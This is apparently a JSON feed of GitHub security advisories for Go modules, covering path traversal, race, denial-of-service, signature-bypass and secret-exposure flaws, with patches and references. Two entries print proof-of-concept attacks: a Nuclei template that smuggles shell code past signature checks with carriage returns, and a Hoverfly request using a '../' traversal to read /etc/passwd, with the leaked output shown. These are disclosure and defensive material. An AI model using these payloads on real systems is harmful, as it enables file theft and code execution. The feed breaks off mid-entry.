{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability exists in stripe-cli versions 1.11.1 and higher where a plugin package containing a manifest with a malformed plugin shortname installed using the --archive-url or --archive-path flags can overwrite arbitrary files.</p>\n<p>The update addresses the path traversal vulnerability by removing the ability to install plugins from an archive URL or path.</p>\n<p>There has been no evidence of exploitation of this vulnerability.</p>\n<h3 id=\"recommendation\">Recommendation</h3>\n<p>Upgrade to stripe-cli v1.21.3.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Email us at <a href=\"mailto:security@stripe.com\">security@stripe.com</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/stripe/stripe-cli/security/advisories/GHSA-fv4g-gwpj-74gr\">https://github.com/stripe/stripe-cli/security/advisories/GHSA-fv4g-gwpj-74gr</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fv4g-gwpj-74gr\">https://github.com/advisories/GHSA-fv4g-gwpj-74gr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fv4g-gwpj-74gr",
            "title": "[github.com/stripe/stripe-cli] Path traversal vulnerability in stripe-cli ",
            "date_modified": "2024-09-05T16:40:42.000Z",
            "date_published": "2024-09-05T16:40:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fv4g-gwpj-74gr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>runc 1.1.13 and earlier as well as 1.2.0-rc2 and earlier can be tricked into\ncreating empty files or directories in arbitrary locations in the host\nfilesystem by sharing a volume between two containers and exploiting a race\nwith os.MkdirAll. While this can be used to create empty files, existing\nfiles <strong>will not</strong> be truncated.</p>\n<p>An attacker must have the ability to start containers using some kind of custom\nvolume configuration. Containers using user namespaces are still affected, but\nthe scope of places an attacker can create inodes can be significantly reduced.\nSufficiently strict LSM policies (SELinux/Apparmor) can also in principle block\nthis attack -- we suspect the industry standard SELinux policy may restrict\nthis attack's scope but the exact scope of protection hasn't been analysed.</p>\n<p>This is exploitable using runc directly as well as through Docker and\nKubernetes.</p>\n<p>The CVSS score for this vulnerability is\nCVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N (Low severity, 3.6).</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Using user namespaces restricts this attack fairly significantly such that the\nattacker can only create inodes in directories that the remapped root\nuser/group has write access to. Unless the root user is remapped to an actual\nuser on the host (such as with rootless containers that don't use\n/etc/sub[ug]id), this in practice means that an attacker would only be able to\ncreate inodes in world-writable directories.</p>\n<p>A strict enough SELinux or AppArmor policy could in principle also restrict the\nscope if a specific label is applied to the runc runtime, though we haven't\nthoroughly tested to what extent the standard existing policies block this\nattack nor what exact policies are needed to sufficiently restrict this attack.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in runc v1.1.14 and v1.2.0-rc3.</p>\n<ul>\n<li><code>main</code> patches:<ul>\n<li><a href=\"https://github.com/opencontainers/runc/pull/4359\">https://github.com/opencontainers/runc/pull/4359</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7\">https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7</a></li>\n</ul>\n</li>\n<li><code>release-1.1</code> patches:<ul>\n<li><a href=\"https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e\">https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf\">https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Rodrigo Campos Catelin (@rata) and Alban Crequy (@alban) from\nMicrosoft for discovering and reporting this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/opencontainers/runc/security/advisories/GHSA-jfvp-7x6p-h2pv\">https://github.com/opencontainers/runc/security/advisories/GHSA-jfvp-7x6p-h2pv</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/pull/4359\">https://github.com/opencontainers/runc/pull/4359</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7\">https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e\">https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf\">https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45310\">https://nvd.nist.gov/vuln/detail/CVE-2024-45310</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jfvp-7x6p-h2pv\">https://github.com/advisories/GHSA-jfvp-7x6p-h2pv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jfvp-7x6p-h2pv",
            "title": "[github.com/opencontainers/runc] runc can be confused to create empty files/directories on the host",
            "date_modified": "2024-09-05T14:04:57.000Z",
            "date_published": "2024-09-03T19:49:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jfvp-7x6p-h2pv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>sigstore-go is susceptible to a denial of service attack when a verifier is provided a maliciously crafted Sigstore Bundle containing large amounts of verifiable data, in the form of signed transparency log entries, RFC 3161 timestamps, and attestation subjects. The verification of these data structures is computationally expensive. This can be used to consume excessive CPU resources, leading to a denial of service attack. TUF's security model labels this type of vulnerability an \"Endless data attack,\" and can lead to verification failing to complete and disrupting services that rely on sigstore-go for verification.</p>\n<p>The vulnerable loops are in the verification functions in the package <code>github.com/sigstore/sigstore-go/pkg/verify</code>. The first is the DSSE envelope verification loop in <code>verifyEnvelopeWithArtifact</code>, which decodes all the digests in an attestation can be found here:</p>\n<p><a href=\"https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/signature.go#L183-L193\">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/signature.go#L183-L193</a></p>\n<p>The next loop is in the <code>VerifyArtifactTransparencyLog</code> function, which verifies all the signed entries in a bundle:</p>\n<p><a href=\"https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tlog.go#L74-L178\">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tlog.go#L74-L178</a></p>\n<p>The next loop is the <code>VerifyTimestampAuthority</code> function, which verifies all the RFC 3161 timestamps in a bundle:</p>\n<p><a href=\"https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tsa.go#L59-L68\">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tsa.go#L59-L68</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability is addressed with sigstore-go 0.6.1, which adds hard limits to the number of verifiable data structures that can be processed in a bundle. Verification will fail if a bundle has data that exceeds these limits. The limits are:</p>\n<ul>\n<li>32 signed transparency log entries</li>\n<li>32 RFC 3161 timestamps</li>\n<li>1024 attestation subjects</li>\n<li>32 digests per attestation subject</li>\n</ul>\n<p>These limits are intended to be high enough to accommodate the vast majority of use cases, while preventing the verification of maliciously crafted bundles that contain large amounts of verifiable data.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The best way to mitigate the risk is to upgrade to sigstore-go 0.6.1 or later. Users who are vulnerable but unable to quickly upgrade may consider adding manual bundle validation to enforce limits similar to those in the referenced patch prior to calling sigstore-go's verification functions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sigstore/sigstore-go/security/advisories/GHSA-cq38-jh5f-37mq\">https://github.com/sigstore/sigstore-go/security/advisories/GHSA-cq38-jh5f-37mq</a></li>\n<li><a href=\"https://github.com/sigstore/sigstore-go/commit/01e70e89e58226286d7977b4dba43b6be472b12c\">https://github.com/sigstore/sigstore-go/commit/01e70e89e58226286d7977b4dba43b6be472b12c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45395\">https://nvd.nist.gov/vuln/detail/CVE-2024-45395</a></li>\n<li><a href=\"https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/signature.go#L183-L193\">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/signature.go#L183-L193</a></li>\n<li><a href=\"https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tlog.go#L74-L178\">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tlog.go#L74-L178</a></li>\n<li><a href=\"https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tsa.go#L59-L68\">https://github.com/sigstore/sigstore-go/blob/725e508ed4933e6f5b5206e32af4bbe76f587b54/pkg/verify/tsa.go#L59-L68</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cq38-jh5f-37mq\">https://github.com/advisories/GHSA-cq38-jh5f-37mq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cq38-jh5f-37mq",
            "title": "[github.com/sigstore/sigstore-go] sigstore-go has an unbounded loop over untrusted input can lead to endless data attack",
            "date_modified": "2024-09-04T21:34:55.000Z",
            "date_published": "2024-09-04T20:18:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cq38-jh5f-37mq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>A vulnerability has been identified in Nuclei's template signature verification system that could allow an attacker to bypass the signature check and possibly execute malicious code via custom code template.</p>\n<h2 id=\"affected-component\">Affected Component</h2>\n<p>The vulnerability is present in the template signature verification process, specifically in the <code>signer</code> package.</p>\n<h2 id=\"description\">Description</h2>\n<p>The vulnerability stems from a discrepancy between how the signature verification process and the YAML parser handle newline characters, combined with the way multiple signatures are processed. This allows an attacker to inject malicious content into a template while maintaining a valid signature for the benign part of the template.</p>\n<h3 id=\"affected-users\">Affected Users</h3>\n<ol>\n<li><strong>CLI Users:</strong> Those executing <strong>custom code templates</strong> from unverified sources. This includes templates authored by third parties or obtained from unverified repositories.</li>\n<li><strong>SDK Users:</strong> Developers integrating Nuclei into their platforms, particularly if they permit the execution of <strong>custom code templates</strong> by end-users.</li>\n</ol>\n<blockquote>\n<p>[!NOTE]\nCode templates are disabled as default, users have to explicitly enable with <code>-code</code> option. </p>\n</blockquote>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<pre><code class=\"language-yaml\">id: example-template\ninfo:\n  name: Example Template\n# Other benign content...\n# digest: &lt;valid_signature_for_benign_content&gt;\n# digest: &lt;another_signature&gt;\\r\ncode:\\r\n  - engine:\\r\n      - sh\\r\n      - bash\\r\n    source: |\\r\n      id\\r\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<ol>\n<li>The vulnerability is addressed in Nuclei v3.3.2 Users are strongly recommended to update to this version to mitigate the security risk.</li>\n<li>Fix reference - <a href=\"https://github.com/projectdiscovery/nuclei/commit/0da993afe6d41b4b1b814e8fad23a2acba13c60a\">https://github.com/projectdiscovery/nuclei/commit/0da993afe6d41b4b1b814e8fad23a2acba13c60a</a></li>\n</ol>\n<h3 id=\"mitigation\">Mitigation</h3>\n<ul>\n<li><strong>Immediate Upgrade</strong>: The primary recommendation is to upgrade to Nuclei v3.2.0, where the vulnerability has been patched.</li>\n<li><strong>Avoid Unverified Templates</strong>: As an interim measure, users should refrain from using custom templates if unable to upgrade immediately. Only trusted, <a href=\"https://github.com/projectdiscovery/nuclei-templates\">verified templates</a> should be executed.</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are unable to upgrade nuclei, disable running custom code templates as workaround.</p>\n<h2 id=\"acknowledgments\">Acknowledgments</h2>\n<p>We would like to thank <a href=\"https://github.com/GuyGoldenberg\">Guy Goldenberg</a> from Wiz who reported this to us via our security email, <a href=\"mailto:security@projectdiscovery.io\">security@projectdiscovery.io</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-7h5p-mmpp-hgmm\">https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-7h5p-mmpp-hgmm</a></li>\n<li><a href=\"https://github.com/projectdiscovery/nuclei/commit/0da993afe6d41b4b1b814e8fad23a2acba13c60a\">https://github.com/projectdiscovery/nuclei/commit/0da993afe6d41b4b1b814e8fad23a2acba13c60a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43405\">https://nvd.nist.gov/vuln/detail/CVE-2024-43405</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7h5p-mmpp-hgmm\">https://github.com/advisories/GHSA-7h5p-mmpp-hgmm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7h5p-mmpp-hgmm",
            "title": "[github.com/projectdiscovery/nuclei] Nuclei Template Signature Verification Bypass",
            "date_modified": "2024-09-04T20:24:43.000Z",
            "date_published": "2024-09-04T17:38:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7h5p-mmpp-hgmm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"details\">Details</h3>\n<p>The <code>/api/v2/simulation</code> <a href=\"https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/handlers/v2/simulation_handler.go#L87\">POST handler</a> allows users to create new simulation views from the contents of a user-specified file. This feature can be abused by an attacker to read arbitrary files from the Hoverfly server.</p>\n<pre><code class=\"language-go\"># https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/hoverfly_funcs.go#L186\nfunc (hf *Hoverfly) readResponseBodyFile(filePath string) (string, error) {\n    if filepath.IsAbs(filePath) {\n        return \"\", fmt.Errorf(\"bodyFile contains absolute path (%s). only relative is supported\", filePath)\n    }\n\n    fileContents, err := ioutil.ReadFile(filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath))\n    if err != nil {\n        return \"\", err\n    }\n\n    return string(fileContents[:]), nil\n}\n</code></pre>\n<p>Note that, although the code prevents absolute paths from being specified, an attacker can escape out of the <code>hf.Cfg.ResponsesBodyFilesPath</code> base path by using <code>../</code> segments and reach any arbitrary files.</p>\n<p>This issue was found using the <a href=\"https://codeql.github.com/codeql-query-help/go/go-path-injection/\">Uncontrolled data used in path expression CodeQL query for python</a>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<p>Send the following <code>POST</code> request to read the <code>/etc/passwd</code> file:</p>\n<pre><code class=\"language-http\">POST /api/v2/simulation HTTP/1.1\nHost: localhost:8888\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 128\n\n{\"data\":{\"pairs\":[{\n\"request\":{},\"response\": {\n\"bodyFile\": \"../../../../../etc/passwd\"}} ]},\"meta\":{\"schemaVersion\":\"v5.2\"}}\n</code></pre>\n<p>Response will contain the Hoverfly's server <code>/etc/passwd</code></p>\n<pre><code>HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\nDate: Tue, 19 Dec 2023 20:59:16 GMT\nContent-Length: 1494\nConnection: close\n\n{\"data\":{\"pairs\":[{\"request\":{},\"response\":{\"status\":0,\"body\":\"root:x:0:0:root:/root:/bin/ash\\nbin:x:1:1:bin:/bin:/sbin/nologin\\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\\nadm:x:3:4:adm:/var/adm:/sbin/nologin\\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\\nsync:x:5:0:sync:/sbin:/bin/sync\\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\\nhalt:x:7:0:halt:/sbin:/sbin/halt\\nmail:x:8:12:mail:/var/mail:/sbin/nologin\\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\\noperator:x:11:0:operator:/root:/sbin/nologin\\nman:x:13:15:man:/usr/man:/sbin/nologin\\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\\ngames:x:35:35:games:/usr/games:/sbin/nologin\\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\\nguest:x:405:100:guest:/dev/null:/sbin/nologin\\nnobody:x:65534:65534:nobody:/:/sbin/nologin\\n\",\"bodyFile\":\"../../../../../etc/passwd\",\"encodedBody\":false,\"templated\":false}}],\"globalActions\":{\"delays\":[],\"delaysLogNormal\":[]}},\"meta\":{\"schemaVersion\":\"v5.2\",\"hoverflyVersion\":\"v1.6.1\",\"timeExported\":\"2023-12-19T20:59:16Z\"}}\n</code></pre>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue may lead to Information Disclosure.</p>\n<h4 id=\"remediation\">Remediation</h4>\n<p>The code is <a href=\"https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/hoverfly_funcs.go#L186\">preventing absolute paths from being read</a>. Make sure the final path (<code>filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath)</code>) is contained within the expected base path (<code>filepath.Join(hf.Cfg.ResponsesBodyFilesPath, \"/\")</code>)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-6xx4-x46f-f897\">https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-6xx4-x46f-f897</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45388\">https://nvd.nist.gov/vuln/detail/CVE-2024-45388</a></li>\n<li><a href=\"https://codeql.github.com/codeql-query-help/go/go-path-injection\">https://codeql.github.com/codeql-query-help/go/go-path-injection</a></li>\n<li><a href=\"https://github.com/SpectoLabs/hoverfly/releases/tag/v1.10.3\">https://github.com/SpectoLabs/hoverfly/releases/tag/v1.10.3</a></li>\n<li><a href=\"https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/handlers/v2/simulation_handler.go#L87\">https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/handlers/v2/simulation_handler.go#L87</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6xx4-x46f-f897\">https://github.com/advisories/GHSA-6xx4-x46f-f897</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6xx4-x46f-f897",
            "title": "[github.com/spectolabs/hoverfly] Hoverfly allows an arbitrary file read in the `/api/v2/simulation` endpoint (`GHSL-2023-274`)",
            "date_modified": "2024-09-03T21:01:54.000Z",
            "date_published": "2024-09-03T21:01:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6xx4-x46f-f897"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Vault Community Edition and Vault Enterprise experienced a regression where functionality that HMAC’d sensitive headers in the configured audit device, specifically client tokens and token accessors, was removed. This resulted in the plaintext values of client tokens and token accessors being stored in the audit log. This vulnerability, CVE-2024-8365, was fixed in Vault Community Edition and Vault Enterprise 1.17.5 and Vault Enterprise 1.16.9.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8365\">https://nvd.nist.gov/vuln/detail/CVE-2024-8365</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-18-vault-leaks-client-token-and-token-accessor-in-audit-devices\">https://discuss.hashicorp.com/t/hcsec-2024-18-vault-leaks-client-token-and-token-accessor-in-audit-devices</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jjxf-26c9-77gm\">https://github.com/advisories/GHSA-jjxf-26c9-77gm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jjxf-26c9-77gm",
            "title": "[github.com/hashicorp/vault] Vault Leaks Client Token and Token Accessor in Audit Devices",
            "date_modified": "2024-09-04T17:02:28.000Z",
            "date_published": "2024-09-02T06:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jjxf-26c9-77gm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Bare Metal Operator (BMO) implements a Kubernetes API for managing bare metal hosts in Metal3. The <code>BareMetalHost</code> (BMH) CRD allows the <code>userData</code>, <code>metaData</code>, and <code>networkData</code> for the provisioned host to be specified as links to Kubernetes Secrets. There are fields for both the <code>Name</code> and <code>Namespace</code> of the Secret, meaning that the baremetal-operator will read a <code>Secret</code> from any namespace. A user with access to create or edit a <code>BareMetalHost</code> can thus exfiltrate a <code>Secret</code> from another namespace by using it as e.g. the <code>userData</code> for provisioning some host (note that this need not be a real host, it could be a VM somewhere).</p>\n<h3 id=\"limiting-factors\">Limiting factors</h3>\n<p>BMO will only read a key with the name <code>value</code> (or <code>userData</code>, <code>metaData</code>, or <code>networkData</code>), so that limits the exposure somewhat. <code>value</code> is probably a pretty common key though. Secrets used by <em>other</em> <code>BareMetalHost</code>s in different namespaces are always vulnerable.</p>\n<p>It is probably relatively unusual for anyone other than cluster administrators to have RBAC access to create/edit a <code>BareMetalHost</code>. This vulnerability is only meaningful, if the cluster has users other than administrators and users' privileges are limited to their respective namespaces.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patch prevents BMO from accepting links to Secrets from other namespaces as BMH input. Any BMH configuration is only read from the same namespace only.</p>\n<p>The problem is patched in BMO releases v0.8.0, v0.6.2 and v0.5.2 and users should upgrade to those versions. Prior upgrading and if needed, duplicate the BMC Secrets to the namespace where the corresponding BMH is. After upgrade, remove the old Secrets.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Operator can configure BMO RBAC to be namespace scoped for Secrets, instead of cluster scoped, to prevent BMO from accessing Secrets from other namespaces.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43803\">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1929\">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1930\">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1931\">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p\">https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74\">https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb\">https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7\">https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43803\">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1929\">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1930\">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1931\">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pqfh-xh7w-7h3p\">https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pqfh-xh7w-7h3p",
            "title": "[github.com/metal3-io/baremetal-operator] The Bare Metal Operator (BMO) can expose particularly named secrets from other namespaces via BMH CRD",
            "date_modified": "2024-09-03T21:45:29.000Z",
            "date_published": "2024-09-03T20:13:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pqfh-xh7w-7h3p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Bare Metal Operator (BMO) implements a Kubernetes API for managing bare metal hosts in Metal3. The <code>BareMetalHost</code> (BMH) CRD allows the <code>userData</code>, <code>metaData</code>, and <code>networkData</code> for the provisioned host to be specified as links to Kubernetes Secrets. There are fields for both the <code>Name</code> and <code>Namespace</code> of the Secret, meaning that the baremetal-operator will read a <code>Secret</code> from any namespace. A user with access to create or edit a <code>BareMetalHost</code> can thus exfiltrate a <code>Secret</code> from another namespace by using it as e.g. the <code>userData</code> for provisioning some host (note that this need not be a real host, it could be a VM somewhere).</p>\n<h3 id=\"limiting-factors\">Limiting factors</h3>\n<p>BMO will only read a key with the name <code>value</code> (or <code>userData</code>, <code>metaData</code>, or <code>networkData</code>), so that limits the exposure somewhat. <code>value</code> is probably a pretty common key though. Secrets used by <em>other</em> <code>BareMetalHost</code>s in different namespaces are always vulnerable.</p>\n<p>It is probably relatively unusual for anyone other than cluster administrators to have RBAC access to create/edit a <code>BareMetalHost</code>. This vulnerability is only meaningful, if the cluster has users other than administrators and users' privileges are limited to their respective namespaces.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patch prevents BMO from accepting links to Secrets from other namespaces as BMH input. Any BMH configuration is only read from the same namespace only.</p>\n<p>The problem is patched in BMO releases v0.8.0, v0.6.2 and v0.5.2 and users should upgrade to those versions. Prior upgrading and if needed, duplicate the BMC Secrets to the namespace where the corresponding BMH is. After upgrade, remove the old Secrets.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Operator can configure BMO RBAC to be namespace scoped for Secrets, instead of cluster scoped, to prevent BMO from accessing Secrets from other namespaces.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43803\">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1929\">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1930\">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1931\">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p\">https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74\">https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb\">https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7\">https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43803\">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>\n<li><a 